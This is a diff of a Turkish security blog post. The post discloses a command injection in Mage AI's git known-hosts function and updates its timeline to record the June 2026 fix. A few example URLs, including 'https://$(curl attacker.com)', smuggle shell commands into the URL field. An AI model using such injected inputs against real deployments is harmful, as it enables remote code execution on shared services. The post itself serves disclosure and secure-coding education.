@@ -1,15 +1,15 @@
 ---
 layout: post
-title: "Mage AI git config'inde command injection (26 aydır açık)"
+title: "Mage AI git config'inde command injection (26 ay açık kaldı)"
 author: Yunus Aydın
-date: 2026-06-14
+date: 2026-10-06
 lang: tr
-description: "Mage AI'ın add_host_to_known_hosts fonksiyonunda command injection. Nisan 2024'te raporladım, 26 ay sonra hala master'da düzeltilmedi."
+description: "Mage AI'ın add_host_to_known_hosts fonksiyonunda command injection. Nisan 2024'te raporladım, 26 ay sessizlikten sonra Haziran 2026'da düzeltildi."
 keywords: "mage-ai, command injection, shell=true, CWE-78, Python güvenlik, urlparse, ssh-keyscan, subprocess, data pipeline güvenlik, güvenlik araştırması"
-canonical_url: "https://aydinnyunus.github.io/2026/06/14/command-injection-mage-ai-git-utils-tr/"
+canonical_url: "https://aydinnyunus.github.io/2026/10/06/command-injection-mage-ai-git-utils-tr/"
 ---
 
-Bu OS command injection'ı [mage-ai](https://github.com/mage-ai/mage-ai) projesine 11 Nisan 2024'te [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak raporladım. `bug` etiketi aldı, beş gün sonra bir maintainer'a atandı, sonra hiçbir şey olmadı. Bugün, 14 Haziran 2026 itibarıyla fonksiyon hala `master`'da savunmasız. 26 aydır açık. 4 Haziran'da reproduction ve regression testle birlikte kendi fix PR'ımı ([#6117](https://github.com/mage-ai/mage-ai/pull/6117)) açtım; daha review edilmedi.
+Bu OS command injection'ı [mage-ai](https://github.com/mage-ai/mage-ai) projesine 11 Nisan 2024'te [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak raporladım. `bug` etiketi aldı, beş gün sonra bir maintainer'a atandı, sonra hiçbir şey olmadı. Fonksiyon `master`'da 26 ay boyunca savunmasız bekledi. 4 Haziran 2026'da başka bir contributor benim raporuma atıfla bir fix PR'ı ([#6117](https://github.com/mage-ai/mage-ai/pull/6117)) açtı; mevcut `master`'a karşı doğrulayıp onayladım, 23 Haziran'da merge edildi ve issue kapandı. Raporlamadan yamaya 26 ay.
 
 Bunu, data orchestration tool'larının ne kadar çoğunun SSH üzerinden git'e delege ettiğini fark ettikten sonra repo'da `shell=True` arayarak buldum. Mage AI Python tabanlı bir pipeline aracı (Airflow alternatifi gibi düşün) ve git entegrasyonu kullanıcıların UI'dan remote bir repo bağlamasına izin veriyor. O URL doğrudan shell'e akıyor.
 
@@ -23,7 +23,7 @@ def run_command(command: str) -> None:
     proc.wait()
 ```
 
-Önemli olan caller `add_host_to_known_hosts`. Kullanıcıdan remote repo URL'ini alıyor, `urlparse`'tan geçiriyor, sonucu shell string'ine yedirir:
+Önemli olan caller `add_host_to_known_hosts`. Kullanıcıdan remote repo URL'ini alıyor, `urlparse`'tan geçiriyor, sonucu shell string'ine besler:
 
 ```python
 def add_host_to_known_hosts(remote_repo_link: str):
@@ -79,7 +79,7 @@ Aynı root cause, daha küçük test ortamı.
 
 ## Nasıl tetikleniyor
 
-Mage AI, proje sahibinin remote repository URL'ini girebileceği bir git settings UI sunuyor. O URL `add_host_to_known_hosts`'un input'u. Zafiyet bağlantı ilk kurulduğunda ateşleniyor. Multi-tenant deployment'ta (Mage AI yaygın olarak bir data takımı için paylaşımlı internal servis olarak çalıştırılır), git remote'unu konfigüre edebilen herhangi bir kullanıcı Mage AI process kullanıcısı olarak komut çalıştırabilir. O process tipik olarak pipeline credential'larına, warehouse bağlantılarına ve host'a bağlı cloud IAM role'üne erişim sahibi.
+Mage AI, proje sahibinin remote repository URL'ini girebileceği bir git settings UI sunuyor. O URL `add_host_to_known_hosts`'un input'u. Zafiyet bağlantı ilk kurulduğunda ateşleniyor. Multi-tenant deployment'ta (Mage AI yaygın olarak bir data takımı için paylaşımlı internal servis olarak çalıştırılır), git remote'unu konfigüre edebilen herhangi bir kullanıcı Mage AI process kullanıcısı olarak komut çalıştırabilir. O process tipik olarak pipeline credential'larına, warehouse bağlantılarına ve host'a bağlı cloud IAM role'üne erişim sahibi. Pratikte bu, IAM role'ünün izin verdiği etki alanıyla orchestrator üzerinde RCE demek.
 
 ## Düzeltme
 
@@ -110,7 +110,7 @@ Aynı fix `create_ssh_keys`'e de uygulanmalı; o da CodeCommit URL'lerini tespit
 
 ## Bu pattern neden tekrar tekrar çıkıyor
 
-`shell=True` daha önce bir bash one-liner yazmış olan herkesin default mental modeli. Pipe ve redirect olarak düşünüyorsun, string olarak yazıyorsun, `subprocess.Popen` o string'i hiç şikayet etmeden kabul ediyor. Liste-of-args formu gerçekten `>>` veya `|`'ye ihtiyacın olduğunda daha hantal hissettiriyor, o yüzden insanlar istedikleri redirect'i almak için `shell=True`'ya uzanıyor ve sonra geri dönmüyor.
+`shell=True` daha önce bir bash one-liner yazmış olan herkesin default mental modeli. Pipe ve redirect olarak düşünüyorsun, string olarak yazıyorsun, `subprocess.Popen` o string'i hiç şikayet etmeden kabul ediyor. Argüman listesi formu gerçekten `>>` veya `|`'ye ihtiyacın olduğunda daha hantal hissettiriyor, o yüzden insanlar istedikleri redirect'i almak için `shell=True`'ya uzanıyor ve sonra geri dönmüyor.
 
 İşin öbür yanı, `urlparse`'ın sanitization gibi görünmesi. `hostname` attribute'u dönüyor. Değeri küçük harfe çeviriyor. Port'u siliyor. URL parse edilmiş ve valide edilmiş gibi hissettiriyor. Bunların hiçbiri güvenlik anlamında doğru değil. `urlparse` sana `https://;whoami` için de hostname dönecek, `https://$(curl attacker.com)` için de, `https://a b c` için de. O bir yapısal parser, allowlist değil. Çıktıyı bir shell komutuna interpolate etmek için güvenli kabul eden herkes contract'ı yanlış okumuş.
 
@@ -118,12 +118,13 @@ Aynı pattern (kullanıcı kontrolündeki URL, validation gibi görünen yapısa
 
 ## Raporlama zaman çizelgesi
 
-- **11 Nisan 2024**: Ben mage-ai'a [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak PoC ile birlikte raporladım.
+- **11 Nisan 2024**: PoC ile birlikte mage-ai'a [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak raporladım.
 - **16 Nisan 2024**: Issue bir maintainer'a atandı. Sonra hiç aktivite yok.
-- **4 Haziran 2026**: Ben mevcut `master`'a karşı doğrulanmış reproduction, minimal fix ve regression testle [PR #6117](https://github.com/mage-ai/mage-ai/pull/6117)'ı açtım.
-- **14 Haziran 2026**: `master`'da hala düzeltilmedi. PR review bekliyor.
+- **4 Haziran 2026**: gistrec, benim raporuma atıfla mevcut `master`'a karşı doğrulanmış reproduction, minimal fix ve regression test içeren [PR #6117](https://github.com/mage-ai/mage-ai/pull/6117)'yi açtı. İnceleyip onayladım.
+- **23 Haziran 2026**: PR `master`'a merge edildi, issue #4924 kapandı. Toplam açık kalma süresi: 26 ay.
+- **24 Temmuz 2026**: Devam issue'su [#6166](https://github.com/mage-ai/mage-ai/issues/6166): yamalanmış fonksiyon `ssh-keyscan` başarısız olduğunda yine de `True` dönüyor. Fix injection'ı kapattı, özensizliği kapatmadı.
 
-Mage AI'ı production'da çalıştırıyorsan, bu patch'lenene kadar git settings sayfasını güvenilmeyen kullanıcılara açma. Fork çalıştırıyorsan, PR #6117'deki değişikliği kendin uygula. 26 ay bekleme.
+Mage AI'ı production'da çalıştırıyorsan, PR #6117'yi içeren bir sürüme geç. Eski bir sürüm ya da fork çalıştırıyorsan, remote konfigüre edebilen her kullanıcı için git settings sayfası hala bir RCE yüzeyi. Bir şey maintain ediyorsan: elinde çalışan PoC olan bir reporter'ı tek satırlık fix için 26 ay bekletme.
 
 ## Referanslar
 
